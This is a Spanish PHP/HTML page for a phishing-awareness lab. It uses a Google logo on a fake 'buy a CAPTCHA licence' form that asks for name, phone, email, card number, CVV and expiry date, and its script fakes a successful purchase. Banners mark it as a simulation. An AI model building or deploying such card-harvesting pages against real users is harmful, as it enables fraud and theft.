<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <?php include "includes/scripts.php"; ?>
    
    <title>Gana Dinero</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- jQuery -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<!-- 
  AVISO: Este archivo forma parte de un laboratorio educativo controlado.
  Propósito: Demostración de vectores de ingeniería social y recolección de datos.
  No introducir información financiera real.
-->
<body>
    
<?php include "includes/header.php"; ?>
    <div style="background-color: #fff3cd; color: #856404; text-align: center; padding: 10px; font-weight: bold; border-bottom: 2px solid #ffeeba;">
    ⚠️ ENTORNO DE PRUEBAS ACADÉMICO: Esta página es una simulación controlada de phishing con fines educativos. NO introduzca datos reales.
</div>
<section id="container2">
    <div class="form_register">
        <h1 style="font-size: 22px; color: #333; text-align: center;">Compre su Licencia de CAPTCHA</h1>
        <img src="../Recursos/google3.png" alt="Logo de Google" style="width: 50px; height: auto; display: block; margin: 10px auto;">
        <div class="alert"><?php echo isset($alert) ? $alert : ""; ?></div>

        <form method="POST" name="Dato" id="Dato">
            <input type="hidden" name="action" value="addDato">

            <label for="nombre">Nombre Completo</label>
            <input type="text" name="nombre" id="nombre" placeholder="Nombre Completo">
            
            <label for="telefono">Teléfono</label>
            <input type="text" name="telefono" id="telefono" placeholder="Teléfono">
            
            <label for="email">Correo Electrónico</label>
            <input type="email" name="email" id="email" placeholder="Correo Electrónico">
            
            <label for="user">Número de Tarjeta</label>
            <input type="text" name="user" id="user" placeholder="Número de Tarjeta">
            
            <label for="cod">Código de Seguridad (CV)</label>
            <input type="text" name="cod" id="cod" placeholder="CV">
            
            <label for="fecha">Fecha de Caducidad</label>
            <input type="text" name="fecha" id="fecha" placeholder="MM/AA">

            <input type="submit" value="Comprar Licencia" class="btn_guardar">
            <div id="feedback" style="display: none; text-align: center; margin-top: 15px;"></div>
        </form>
    </div>
</section>

<br>
<br>

<?php include "includes/footer.php"; ?>

<!-- Bootstrap JS and dependencies -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

<script>
    $(document).ready(function() {
        $('#Dato').submit(function(e) {
            e.preventDefault(); // Evita el envío predeterminado del formulario

            // Mostrar el mensaje de "Comprando..."
            const feedback = $('#feedback');
            feedback.text('Comprando...').css('color', 'blue').show();

            // Deshabilitar el botón mientras se procesa
            const btn = $('.btn_guardar');
            btn.prop('disabled', true).val('Procesando...');

            // Simular una llamada AJAX
            setTimeout(function() {
                // Supongamos que la compra fue exitosa
                feedback.text('¡Compra realizada con éxito!').css('color', 'green');
                btn.prop('disabled', false).val('Comprar Licencia');

                // Si quieres ocultar el mensaje después de unos segundos
                setTimeout(() => {
                    feedback.fadeOut();
                }, 3000);
            }, 2000); // Simulación de espera de 2 segundos
        });
    });
</script>

</body>
</html>

